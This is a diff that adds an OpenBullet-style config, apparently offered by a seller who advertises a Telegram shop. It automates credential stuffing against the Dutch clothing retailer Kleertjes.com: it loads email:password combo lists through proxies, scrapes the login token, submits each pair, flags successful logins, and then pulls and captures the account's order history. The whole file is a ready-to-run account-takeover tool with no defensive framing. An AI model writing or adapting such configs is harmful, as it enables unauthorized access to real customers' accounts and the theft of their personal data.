@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Kleertjes.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-04T03:42:36.0776248+02:00",
+  "AdditionalInfo": "Capture: Bestellingen - Custom: Geen bestellingen | TelegramChannel: https://t.me/DedrilathShop",
+  "Author": "Dedrilath",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.kleertjes.com/inloggen/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "lang=\"nl\" data-token=\"" "|" -> VAR "token1" 
+
+PARSE "<SOURCE>" LR "lang=\"nl\" data-token=\"<token1>|" "\">" -> VAR "token2" 
+
+REQUEST POST "https://www.kleertjes.com/inloggen/" 
+  CONTENT "<token1>=<token2>&FORM_SUBMIT=form_inloggen1&FORM_HAS_VALIDATED=1&usernamelogin=<USER>&passwordlogin=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+REQUEST POST "https://www.kleertjes.com/system/modules/ajax/lib/webservice/load.php" 
+  CONTENT "data=%7B%22service%22%3A%22getOrders%22%2C%22route%22%3A%5B%5D%2C%22params%22%3A%7B%22keyData%22%3A%22QjhBRW5rQjEyYWRFYktYbzhYY0ZIZz09%22%2C%22url%22%3A%22%2Fbestellingen%2F%22%2C%22replaceHistory%22%3Atrue%7D%2C%22state%22%3A%7B%22page%22%3A%221%22%2C%22limit%22%3A%2210%22%2C%22amount_items_in_row%22%3A%223%22%2C%22amount%22%3A0%2C%22start_amount%22%3A0%2C%22first_request%22%3Atrue%7D%2C%22callID%22%3A1%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Helaas zijn er geen bestellingen gevonden.<" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Helaas zijn er geen bestellingen gevonden.<" 
+
+PARSE "<SOURCE>" LR "<\\/strong> van " "bestellingen<\\/p>\\n" CreateEmpty=FALSE -> CAP "Bestellingen" 
+
